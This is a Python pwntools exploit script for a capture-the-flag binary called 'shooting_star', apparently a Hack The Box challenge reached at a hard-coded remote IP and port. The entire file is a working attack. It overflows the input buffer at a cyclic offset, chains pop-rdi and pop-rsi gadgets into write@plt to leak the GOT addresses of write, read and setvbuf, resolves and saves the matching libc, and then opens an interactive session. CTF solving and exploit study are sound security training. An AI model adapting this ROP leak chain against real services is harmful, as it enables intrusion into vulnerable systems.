#!/usr/bin/env python3


from pwn import *
from pwnc.pwnc import get_libc

BINARY = "./shooting_star"
ADDR = "138.68.168.137"
PORT = 30708

splash()
elf = context.binary = ELF(BINARY)


class Gadgets:
    pop_rdi_ret = 0x4012cb
    pop_rsi_pop_r15_ret = 0x4012c9


def conn():
    if args.LOCAL:
        pty = process.PTY
        return process(elf.path, stdin=pty, stdout=pty, stderr=pty)

    else:
        return remote(ADDR, PORT)


def solve() -> None:
    io = conn()

    io.sendlineafter(b"> \x00", "1")
    payload = [
        cyclic(cyclic_find(0x616161616161616a, n=8), n=8),
        Gadgets.pop_rdi_ret,
        0x1,
        Gadgets.pop_rsi_pop_r15_ret,
        elf.got.write,
        0x0,
        elf.plt.write,
    ]
    io.sendline(flat(payload))
    io.recvuntil("May your wish come true!\n")

    write_leak = io.recvn(8)
    write_leak = u64(write_leak.ljust(8, b"\x00"))
    log.success(f"write found @: {hex(write_leak)}")
    read_leak = io.recvn(8)
    read_leak = u64(read_leak.ljust(8, b"\x00"))
    log.success(f"read found @: {hex(read_leak)}")
    setvbuf_leak = io.recvn(8)
    setvbuf_leak = u64(setvbuf_leak.ljust(8, b"\x00"))
    log.success(f"setvbuf found @: {hex(setvbuf_leak)}")

    known_syms = {
        "write": hex(write_leak),
        "read": hex(read_leak),
        "setvbuf": hex(setvbuf_leak),
    }
    libc = get_libc(known_syms)

    with open("./libc.so.6", "wb+") as libc_file:
        libc_file.write(libc)

    io.interactive()


if __name__ == "__main__":
    solve()
